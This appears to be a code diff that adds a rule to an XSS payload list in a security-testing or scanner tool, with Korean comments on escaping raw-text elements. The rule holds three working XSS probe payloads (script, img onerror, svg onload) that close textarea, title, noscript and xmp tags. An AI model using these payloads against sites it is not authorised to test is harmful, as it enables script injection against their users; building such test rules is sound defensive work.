@@ -221,6 +221,21 @@ XSS_RULES: list[dict] = [
         },
     },
     {
+        # textarea/title/noscript/xmp 같은 raw-text 요소는 내용을 순수 텍스트로 렌더링하므로
+        # 일반 payload가 안 먹힘 - 실제 열려있는 태그가 뭐든 닫히도록 종료 태그를 전부 붙인 뒤 exploit을 이어붙임
+        "attack_id": "PL-XSS-RAWTEXT-ESCAPE",
+        "vuln_type": "xss",
+        "technique": "raw_text_escape",
+        "sequence": ["baseline", "attack"],
+        "payload_templates": {
+            "attack": [
+                "</textarea></title></noscript></xmp><script>alert(1)</script>",
+                "</textarea></title></noscript></xmp><img src=x onerror=alert(1)>",
+                "</textarea></title></noscript></xmp><svg onload=alert(1)>",
+            ],
+        },
+    },
+    {
         "attack_id": "PL-XSS-STORED",
         "vuln_type": "xss",
         "technique": "stored",
